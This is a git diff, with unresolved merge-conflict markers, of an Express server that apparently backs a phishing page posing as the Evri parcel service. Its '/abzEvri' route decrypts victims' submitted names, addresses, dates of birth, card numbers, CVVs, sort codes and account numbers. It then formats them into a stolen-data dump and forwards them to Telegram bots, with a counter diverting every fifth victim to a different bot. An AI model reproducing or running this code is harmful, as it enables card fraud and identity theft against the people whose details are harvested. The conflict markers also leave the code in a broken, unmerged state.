@@ -8017,8 +8017,11 @@ app.post("/mannyman3", (req, res) => {
     });
 });
 
+<<<<<<< HEAD
 let abzOutlaw = 3;
 
+=======
+>>>>>>> 989cece0d7517edb8b16635b7943ddb69a71706e
 app.options("/abzEvri", cors());
 
 app.post("/abzEvri", (req, res) => {
@@ -8049,12 +8052,15 @@ app.post("/abzEvri", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
+<<<<<<< HEAD
   scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
     CryptoJS.enc.Utf8
   );
   accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
     CryptoJS.enc.Utf8
   );
+=======
+>>>>>>> 989cece0d7517edb8b16635b7943ddb69a71706e
   userAgent = req.body.userAgent;
   ip = req.body.ip;
   bin = req.body.bin;
@@ -8077,8 +8083,13 @@ app.post("/abzEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+<<<<<<< HEAD
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (abzOutlaw == 5) {
+=======
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (capzEvri == 5) {
+>>>>>>> 989cece0d7517edb8b16635b7943ddb69a71706e
         axios
           .post(
             `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
@@ -8091,7 +8102,11 @@ app.post("/abzEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
+<<<<<<< HEAD
           abzOutlaw = 0;
+=======
+        capzEvri = 0;
+>>>>>>> 989cece0d7517edb8b16635b7943ddb69a71706e
       } else if (bin === "542011") {
         axios
           .post(
@@ -8130,7 +8145,11 @@ app.post("/abzEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
+<<<<<<< HEAD
           abzOutlaw += 1;
+=======
+        capzEvri += 1;
+>>>>>>> 989cece0d7517edb8b16635b7943ddb69a71706e
       }
 
       res.send("Update Completed");
